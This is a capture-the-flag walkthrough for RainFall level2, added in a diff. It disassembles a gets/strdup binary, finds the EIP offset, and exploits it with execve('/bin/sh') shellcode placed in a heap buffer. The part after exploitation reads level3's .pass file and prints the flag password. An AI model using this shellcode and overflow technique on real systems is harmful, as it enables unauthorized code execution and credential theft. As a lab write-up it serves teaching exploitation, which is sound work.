@@ -1,0 +1,145 @@
+# At the root of the repository, we can found an executable named 'level2'
+# By executing this one, we see that the level2 is waiting for an argument (by reading stdin)
+# And print the argument on stdout.
+# We can suppose that we have to exploit this, let's try to send a lot of chars
+
+level2@RainFall:~$ ./level2
+AAAA
+AAAA
+level2@RainFall:~$ (python -c "print('A' * 100)"; cat -) | ~/level2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Segmentation fault (core dumped)
+
+# Oh, segfault, are we writing or reading in a part of memory that we should not have access?
+# Let's see what happend with gdb
+
+gdb ~/level2
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804853f <+0>:	push   %ebp
+   0x08048540 <+1>:	mov    %esp,%ebp
+   0x08048542 <+3>:	and    $0xfffffff0,%esp
+   0x08048545 <+6>:	call   0x80484d4 <p>
+   0x0804854a <+11>:	leave
+   0x0804854b <+12>:	ret
+End of assembler dump.
+
+# The main of the program executes a function named 'p'
+
+(gdb) disas p
+Dump of assembler code for function p:
+   0x080484d4 <+0>:	push   %ebp
+   0x080484d5 <+1>:	mov    %esp,%ebp
+   0x080484d7 <+3>:	sub    $0x68,%esp
+   0x080484da <+6>:	mov    0x8049860,%eax
+   0x080484df <+11>:	mov    %eax,(%esp)
+   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
+   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
+   0x080484ea <+22>:	mov    %eax,(%esp)
+   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
+   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
+   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
+   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
+   0x080484fb <+39>:	and    $0xb0000000,%eax
+   0x08048500 <+44>:	cmp    $0xb0000000,%eax
+   0x08048505 <+49>:	jne    0x8048527 <p+83>
+   0x08048507 <+51>:	mov    $0x8048620,%eax
+   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
+   0x0804850f <+59>:	mov    %edx,0x4(%esp)
+   0x08048513 <+63>:	mov    %eax,(%esp)
+   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
+   0x0804851b <+71>:	movl   $0x1,(%esp)
+   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
+   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
+   0x0804852a <+86>:	mov    %eax,(%esp)
+   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
+   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
+   0x08048535 <+97>:	mov    %eax,(%esp)
+   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
+   0x0804853d <+105>:	leave
+   0x0804853e <+106>:	ret
+End of assembler dump.
+
+# We can see that the program is using 'gets' function that is vulnerable
+# We can also see that the program check if we are writing in the stack and return if it's that case
+   
+   0x080484fb <+39>:	and    $0xb0000000,%eax
+   0x08048500 <+44>:	cmp    $0xb0000000,%eax
+   0x08048505 <+49>:	jne    0x8048527 <p+83>
+
+# Well, the gets exploit that we saw in level1 is useless.
+# But, if we check the end of the 'p' function, we can see that he is using strdup, which uses malloc
+# Let's try a heap exploit
+
+# With some tests we know that the buffer size is 75
+# Thanks to that let's check the offset of EIP
+
+gdb ~/level2
+...
+## Test with 80 chars
+r
+Starting program: /home/user/level2/level2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7ea912f in ?? () from /lib/i386-linux-gnu/libc.so.6
+
+## Test with 82 chars
+(gdb) r
+Starting program: /home/user/level2/level2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08004141 in ?? ()
+
+# As we see, the we rewrite the EIP register by sending 82 chars in the buffer, the offset is 80 (4141 refers to 'AA')
+# To be sure, let's fill the buffer with two more chars
+
+(gdb) r
+Starting program: /home/user/level2/level2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+# The address is 0x41414141 that matches with 'AAAA', we are good, 80 is our offset
+
+# As we said before, we will exploit the heap thanks to malloc in strdup function
+# With ltrace, we can have the memory address that malloc returns, it will be our buffer address
+
+level2@RainFall:~$ ltrace ./level2
+__libc_start_main(0x804853f, 1, 0xbffff7a4, 0x8048550, 0x80485c0 <unfinished ...>
+fflush(0xb7fd1a20)                                                 = 0
+gets(0xbffff6ac, 0, 0, 0xb7e5ec73, 0x80482b5)                      = 0xbffff6ac
+puts("")                                                           = 1
+strdup("")                                                         = 0x0804a008
++++ exited (status 8) +++
+
+# Whatever you send to the program, malloc's memory address still 0x0804a008
+# We have the address of our buffer, now let's fill the address by a shellcode that will execute /bin/sh
+# Our shellcode will executes execve with /bin/sh in argument `execve("/bin/sh")` (https://shell-storm.org/shellcode/files/shellcode-811.html)
+
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+
+# His size is 28 bytes
+# Now we have all the stuff we need to execute our code
+
+# Offset before EIP: 80
+# Size of shellcode: 28
+# Size of NOPs instructions = 80-28 = 52
+# Size of memory address (that will rewrite EIP): 4
+
+(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A' * 52 + '\x08\xa0\x04\x08')"; cat -) | ~/level2
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+Help:
+https://beta.hackndo.com/buffer-overflow/
+https://arxiv.org/pdf/cs/0405073.pdf
+https://shell-storm.org/shellcode/index.html
